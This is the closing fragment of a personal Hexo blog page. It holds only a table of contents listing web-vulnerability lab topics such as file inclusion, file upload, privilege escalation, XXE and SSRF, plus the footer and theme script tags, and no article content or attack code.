class="nav-text">本地文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">8.2.</span> <span class="nav-text">远程文件包含</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-number">9.</span> <span class="nav-text">不安全的文件下载</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-1"><span class="nav-number">9.1.</span> <span class="nav-text">不安全的文件下载</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">10.</span> <span class="nav-text">不安全的文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AFcheck"><span class="nav-number">10.1.</span> <span class="nav-text">客户端check</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AFcheck"><span class="nav-number">10.2.</span> <span class="nav-text">服务端check</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getimagesize"><span class="nav-number">10.3.</span> <span class="nav-text">getimagesize()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B6%8A%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">越权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="nav-number">11.1.</span> <span class="nav-text">水平越权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="nav-number">11.2.</span> <span class="nav-text">垂直越权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">12.</span> <span class="nav-text">目录遍历</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">13.</span> <span class="nav-text">敏感信息泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">14.</span> <span class="nav-text">PHP反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE"><span class="nav-number">15.</span> <span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URL%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">16.</span> <span class="nav-text">URL重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">17.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF-curl"><span class="nav-number">17.1.</span> <span class="nav-text">SSRF(curl)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF-file-get-contents"><span class="nav-number">17.2.</span> <span class="nav-text">SSRF(file_get_contents)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A8%E5%89%A7%E7%BB%88"><span class="nav-number">18.</span> <span class="nav-text">全剧终</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script><div class="post-scripts"><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>